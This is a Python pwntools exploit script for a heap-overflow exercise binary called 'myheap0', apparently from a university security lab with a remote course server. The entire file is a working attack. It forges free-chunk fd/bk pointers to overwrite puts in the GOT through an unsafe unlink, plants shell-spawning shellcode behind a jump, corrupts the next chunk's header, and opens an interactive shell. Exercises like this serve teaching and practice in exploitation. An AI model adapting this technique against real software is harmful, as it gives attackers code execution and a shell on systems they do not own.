from pwn import *

context.binary = elf = ELF('./myheap0')

def get_process():
    if args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4460)
    else:
        return remote('localhost', 4460)


puts_got = elf.got['puts']
log.info("puts@got: " + hex(puts_got))
a_addr = 0x404010
log.info("a: " + hex(a_addr))
b_addr = 0x404120
log.info("b: " + hex(b_addr))


payload = p64(puts_got - 3*8)   # fake fd
payload += p64(a_addr + 2*8)   # fake bk
payload += asm("x: jmp x + 24")  # jump to shellcode
payload += b'A'*22               # padding
payload += asm(shellcraft.sh())  # shellcode
payload += b'B' * (256 - len(payload))  # padding to reach 256 bytes
payload += p64(0x110)
payload += p64(0x10)           # reset PREV_INUSE

p = get_process()
p.sendline(payload)
p.interactive()